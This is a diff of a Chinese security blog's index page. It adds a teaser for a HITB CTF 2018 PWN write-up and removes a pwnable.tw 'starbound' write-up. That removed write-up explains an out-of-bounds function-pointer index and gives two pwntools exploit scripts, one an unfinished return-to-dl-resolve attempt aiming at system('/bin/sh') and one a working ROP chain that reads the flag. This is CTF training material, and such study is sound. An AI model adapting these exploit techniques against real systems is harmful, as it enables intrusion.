@@ -299,6 +299,79 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-hitb2018" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/04/17/hitb2018/" class="article-date">
+      <time datetime="2018-04-17T05:40:06.000Z" itemprop="datePublished">2018-04-17</time>
+</a>
+
+ 
+    <a href="/2018/04/17/hitb2018/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2018/04/17/hitb2018/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/17/hitb2018/">HITB CTF 2018 部分PWN题解</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              记录一下 HITB GSEC CTF 2018 里的once、babypwn和gundam三道PWN题，第一次进入国际比赛的线下赛，٩(๑>◡<๑)۶鸡冻。
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2018/04/17/hitb2018/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-kernel-pwn-start" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -939,94 +1012,6 @@
         <p class="article-more-link">
           <a href="/2017/12/06/pwnable-tw-alivenote/#more">阅读全文 >></a>
         </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-pwnable-tw-starbound" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/10/13/pwnable-tw-starbound/" class="article-date">
-      <time datetime="2017-10-13T02:06:52.000Z" itemprop="datePublished">2017-10-13</time>
-</a>
-
- 
-    <a href="/2017/10/13/pwnable-tw-starbound/#comments" title="查看评论">
-        <i class="fa fa-comments-o" aria-hidden="true"></i>
-        <span class="count-comment"></span>
-        
-        
-            <span class="disqus-comment-count" data-disqus-identifier="2017/10/13/pwnable-tw-starbound/"></span>
-        
-    </a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h1 id="题目功能"><a href="#题目功能" class="headerlink" title="题目功能"></a>题目功能</h1><p>此题的代码量很大，看了一整天的逻辑代码，没发现什么问题…</p>
-<p><img src="/img/starbound/1.png" alt=""></p>
-<p> 整个函数的逻辑主要是红框中两个指针的循环赋值和调用，其中第一个指针是主功能函数，第二个数组是子功能函数。</p>
-<p>函数的漏洞主要在main函数中，main函数中使用了strtol函数将用户输入转换为字符串，并根据此转换结果，对子函数进行访问。</p>
-<p><img src="/img/starbound/2.png" alt=""></p>
-<p>当用户输入过大或过小时，会导致越界访问的问题，其中，strtol函数的返回值可能为负数。</p>
-<p> bss段中，用户输入的名称最开始是随机生成的，但用户可以更改。而此字段在函数指针数组上面，也就是说，用户可以通过控制名称的方式获得一次指令执行的机会</p>
-<p><img src="/img/starbound/3.png" alt=""></p>
-<p><img src="/img/starbound/4.png" alt=""></p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>查看一下安全保护机制</p>
-<p><img src="/img/starbound/5.png" alt=""></p>
-<p>可以使用ROP的方式来利用漏洞。由于main函数中用户可以输入0x100长的字符给v5，因此，v5可作为ROP的存放位置，在name中找到一个gadget使得EIP跳转到位于栈上v5字段内即可。</p>
-<p>由于此题没有附带libc，也没找到可以泄露地址的漏洞，因此在ROP中使用了在plt区域有的open、read、puts函数来打印flag，其中从dalao那里get的知识点是，read函数的第一个参数是一个int类型的值，</p>
-<p>用于标识文件身份，其中0 ： stdin、1：stdout、2：stderr，本题内没有打开未关闭的文件，因此read(3,&amp;buf,0x10)完全可以读出flag。</p>
-<p>另外，恰巧在最近接触到了return to dl-resolve的原理：<a href="http://www.freebuf.com/articles/system/149214.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149214.html</a></p>
-<p> 此题恰巧也符合使用该技术的先决条件，但貌似ld.so做了保护，没有成功，在网上没有找到相关的保护手段，通过调试发现ld.so以偏移量获取了程序.gnu.version的内容，进一步运算，但我构造的偏移量过大，</p>
-<p>导致运算超出了可读写的范围，造成程序崩溃。暂未找到其他方法，此坑以后再填。</p>
-<p> 暂存未成功的return-to-dl-resolve代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line">elf = ELF(<span class="string">'./starbound'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./starbound'</span>)</span><br><span class="line">    file = <span class="string">'~/Desktop/pwn/tw/starbound/flag'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10202</span>)</span><br><span class="line">file = <span class="string">'/home/starbound/flag\0\0\0\0'</span></span><br><span class="line">file = <span class="string">'/bin/sh\0'</span> + <span class="string">'\0'</span>*(len(file)-len(<span class="string">'/bin/sh\0'</span>))</span><br><span class="line">gadget = <span class="number">0x08048e48</span></span><br><span class="line">bss_function = <span class="number">0x08058150</span></span><br><span class="line">bss_name = <span class="number">0x080580D0</span></span><br><span class="line"></span><br><span class="line">shellcode = file + p32(gadget) + p32(<span class="number">0x0805509c</span>) + p32(<span class="number">0x00002807</span>) + <span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] shellcode len '</span>,len(shellcode)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] '</span>,hex(bss_name + len(shellcode) - <span class="number">0x80481dc</span>)</span><br><span class="line">shellcode = file + p32(gadget) + p32(<span class="number">0x0805509c</span>) + p32(<span class="number">0x00002807</span>) + <span class="string">'a'</span>*<span class="number">8</span> + p32(<span class="number">0xe1</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>) </span><br><span class="line">distance3 = bss_name + len(shellcode) - <span class="number">0x80484fc</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] '</span>,hex(distance3)</span><br><span class="line">shellcode = file + p32(gadget) + p32(<span class="number">0x0805509c</span>) + p32(<span class="number">0x000ff207</span>) + <span class="string">'a'</span>*<span class="number">8</span> + p32(distance3)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>) + <span class="string">'system\x00'</span></span><br><span class="line">shellcode = file + p32(gadget) + p32(<span class="number">0x0805509c</span>) + p32(<span class="number">0x00002807</span>) + <span class="string">'a'</span>*<span class="number">8</span> + p32(<span class="number">0xe1</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>) </span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">distance = (bss_name + len(file) - bss_function)/<span class="number">4</span></span><br><span class="line"><span class="comment">#print str(distance) </span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x0804A65D'</span>)</span><br><span class="line">distance2 = bss_name + len(file) + <span class="number">4</span> - <span class="number">0x80487c8</span></span><br><span class="line">cat_flag_exp = str(distance<span class="number">-1</span>) + <span class="string">'\0'</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(<span class="number">0x8048940</span>) + p32(distance2) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_name)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">+ p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \</span></span><br><span class="line"><span class="string">+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">$ readelf -d starbound | grep JMPREL </span></span><br><span class="line"><span class="string"> 0x00000017 (JMPREL)                     0x80487c8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gdb-peda$ x /2x 0x80487c8+0x120</span></span><br><span class="line"><span class="string">0x80488e8:    0x0805509c    0x00002807</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">readelf -d starbound | grep SYM </span></span><br><span class="line"><span class="string"> 0x00000006 (SYMTAB)                     0x80481dc</span></span><br><span class="line"><span class="string"> 0x0000000b (SYMENT)                     16 (bytes)</span></span><br><span class="line"><span class="string"> 0x6ffffff0 (VERSYM)                     0x80486f2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ readelf -d starbound | grep STRTAB</span></span><br><span class="line"><span class="string"> 0x00000005 (STRTAB)                     0x80484fc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p.sendline(cat_flag_exp)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048e48 : add esp, 0x1c ; ret</span></span><br></pre></td></tr></table></figure>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line">elf = ELF(<span class="string">'./starbound'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'./starbound'</span>)</span><br><span class="line">	file = <span class="string">'~/Desktop/pwn/tw/starbound/flag'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10202</span>)</span><br><span class="line">file = <span class="string">'/home/starbound/flag\0\0\0\0'</span></span><br><span class="line">gadget = <span class="number">0x08048e48</span></span><br><span class="line"></span><br><span class="line">shellcode = file + p32(gadget) + <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">bss_function = <span class="number">0x08058150</span></span><br><span class="line">bss_name = <span class="number">0x080580D0</span></span><br><span class="line">distance = (bss_name + len(file) - bss_function)/<span class="number">4</span></span><br><span class="line"><span class="comment">#print str(distance) </span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0804A65D')</span></span><br><span class="line">cat_flag_exp = str(distance<span class="number">-1</span>) + <span class="string">'\0'</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(elf.symbols[<span class="string">'open'</span>]) + p32(gadget) + p32(bss_name) \</span><br><span class="line">+ p32(<span class="number">0</span>)+ <span class="string">'a'</span>*(<span class="number">0x1c</span><span class="number">-8</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(gadget) + p32(<span class="number">3</span>) + p32(bss_name+<span class="number">20</span>) + p32(<span class="number">0x40</span>) +<span class="string">'a'</span>*(<span class="number">0x1c</span><span class="number">-12</span>) + p32(elf.symbols[<span class="string">'puts'</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_name+<span class="number">20</span>)</span><br><span class="line">p.sendline(cat_flag_exp)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x08048e48 : add esp, 0x1c ; ret</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWNABLE-TW/">PWNABLE.TW</a></li></ul>
-    </div>
-
       
       <div class="clearfix"></div>
     </div>
